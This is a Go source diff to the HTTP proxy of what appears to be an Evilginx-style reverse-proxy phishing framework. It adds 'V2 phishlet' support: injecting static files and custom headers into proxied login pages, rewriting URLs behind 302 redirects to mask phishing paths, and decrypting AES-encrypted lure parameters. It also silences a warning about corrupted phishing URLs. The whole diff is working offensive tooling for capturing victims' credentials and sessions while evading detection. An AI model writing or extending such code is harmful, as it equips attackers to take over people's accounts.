@@ -92,6 +92,7 @@ type HttpProxy struct {
 	session_mtx       sync.Mutex
 	livefeed          bool
 	turnstile         bool
+	urlMapper         *URLMapper
 }
 
 type ProxySession struct {
@@ -132,6 +133,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 		livefeed:          livefeed,
 		turnstile:         turnstile,
+		urlMapper:         NewURLMapper(),
 	}
 
 	p.Server = &http.Server{
@@ -198,6 +200,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
+			// Check if this is an asset request for V2 phishlet
+			phishlet := p.getPhishletForHost(req.Host)
+			if phishlet != nil && phishlet.V2 != nil {
+				if IsAssetRequest(req.URL.Path, phishlet.V2) {
+					content, mimeType, ok := GetAssetContent(req.URL.Path, phishlet.V2)
+					if ok {
+						resp := goproxy.NewResponse(req, mimeType, http.StatusOK, "")
+						resp.Body = ioutil.NopCloser(bytes.NewReader(content))
+						resp.Header.Set("Cache-Control", "public, max-age=86400")
+						return req, resp
+					}
+				}
+			}
+
+			// Check if this URL is a rewritten URL
+			if originalURL, exists := p.urlMapper.GetOriginalURL(req.URL.String()); exists {
+				// Replace with original URL for proxying
+				parsedURL, _ := url.Parse(originalURL)
+				req.URL = parsedURL
+				log.Debug("url_rewrite: using original URL: %s", originalURL)
+			} else {
+				// Check if URL should be rewritten
+				phishlet := p.getPhishletForHost(req.Host)
+				if phishlet != nil {
+					if rewrittenURL, shouldRewrite := p.checkURLRewrite(req, phishlet); shouldRewrite {
+						// Return 302 redirect to rewritten URL
+						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+						resp.Header.Set("Location", rewrittenURL)
+						return req, resp
+					}
+				}
+			}
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -1098,6 +1133,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			// Check if this is a V2 phishlet
+			if pl != nil && pl.V2 != nil {
+				// Inject static files
+				contentType := resp.Header.Get("Content-Type")
+				if strings.Contains(contentType, "text/html") {
+					injector := NewStaticInjector(pl.V2)
+					body = injector.InjectIntoResponse(body, contentType, req_hostname, resp.Request.URL.Path)
+				}
+				// Apply custom response headers
+				if pl.V2.Options.CustomHeaders.Response != nil {
+					for k, v := range pl.V2.Options.CustomHeaders.Response {
+						resp.Header.Set(k, v)
+					}
+				}
+			}
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1509,6 +1560,28 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 	var ret bool = false
 	vals := u.Query()
 
+	// Try new AES/Base64 decryption first
+	enc_key_cfg := p.cfg.GetEncryptionKey()
+	for _, v := range vals {
+		decrypted, err := DecryptParams(v[0], enc_key_cfg)
+		if err == nil {
+			var paramsMap map[string]string
+			if err := json.Unmarshal([]byte(decrypted), &paramsMap); err == nil {
+				for kk, vv := range paramsMap {
+					log.Debug("param: %s='%s'", kk, vv)
+					session.Params[kk] = vv
+				}
+				ret = true
+				break
+			}
+		}
+	}
+
+	if ret {
+		return true
+	}
+
+	// Fallback to old RC4 decryption
 	var enc_key string
 
 	for _, v := range vals {
@@ -1539,48 +1612,13 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 						break
 					}
 				} else {
-					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
+					// log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 				}
 			} else {
-				log.Debug("extractParams: %s", err)
+				// log.Debug("extractParams: %s", err)
 			}
 		}
 	}
-	/*
-		   for k, v := range vals {
-			   if len(k) == 2 {
-				   // possible rc4 encryption key
-				   if len(v[0]) == 8 {
-					   enc_key = v[0]
-					   break
-				   }
-			   }
-		   }
-
-		   if len(enc_key) > 0 {
-			   for k, v := range vals {
-				   if len(k) == 3 {
-					   enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					   if err == nil {
-						   dec_params := make([]byte, len(enc_vals))
-
-						   c, _ := rc4.NewCipher([]byte(enc_key))
-						   c.XORKeyStream(dec_params, enc_vals)
-
-						   params, err := url.ParseQuery(string(dec_params))
-						   if err == nil {
-							   for kk, vv := range params {
-								   log.Debug("param: %s='%s'", kk, vv[0])
-
-								   session.Params[kk] = vv[0]
-							   }
-							   ret = true
-							   break
-						   }
-					   }
-				   }
-			   }
-		   }*/
 	return ret
 }
 
@@ -1840,6 +1878,80 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 	}
 
 	return nil
+}
+
+func (p *HttpProxy) getPhishletForHost(hostname string) *Phishlet {
+	return p.getPhishletByPhishHost(hostname)
+}
+
+func (p *HttpProxy) checkURLRewrite(req *http.Request, phishlet *Phishlet) (string, bool) {
+	// Check if URL matches any rewrite rule
+	for _, rule := range phishlet.GetRewriteURLs() {
+		if p.matchesRewriteRule(req, rule) {
+			return p.generateRewrittenURL(req, rule), true
+		}
+	}
+	return "", false
+}
+
+func (p *HttpProxy) matchesRewriteRule(req *http.Request, rule URLRewriteRule) bool {
+	// Check domain
+	domainMatch := false
+	for _, domain := range rule.Trigger.Domains {
+		if strings.Contains(req.Host, domain) {
+			domainMatch = true
+			break
+		}
+	}
+
+	if !domainMatch {
+		return false
+	}
+
+	// Check path
+	for _, path := range rule.Trigger.Paths {
+		matched, _ := regexp.MatchString(path, req.URL.Path)
+		if matched {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (p *HttpProxy) generateRewrittenURL(req *http.Request, rule URLRewriteRule) string {
+	// Generate unique ID
+	id := p.urlMapper.generateID()
+
+	// Build new URL
+	rewrittenURL := &url.URL{
+		Scheme: req.URL.Scheme,
+		Host:   req.Host,
+		Path:   rule.Rewrite.Path,
+	}
+
+	// Build query parameters
+	query := url.Values{}
+
+	// Add custom query parameters
+	for _, param := range rule.Rewrite.Query {
+		value := strings.Replace(param.Value, "{id}", id, -1)
+		query.Set(param.Key, value)
+	}
+
+	// Preserve excluded keys from original query
+	for _, key := range rule.Rewrite.ExcludeKeys {
+		if val := req.URL.Query().Get(key); val != "" {
+			query.Set(key, val)
+		}
+	}
+
+	rewrittenURL.RawQuery = query.Encode()
+
+	// Store mapping
+	p.urlMapper.AddMapping(req.URL.String(), rewrittenURL.String())
+
+	return rewrittenURL.String()
 }
 
 func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
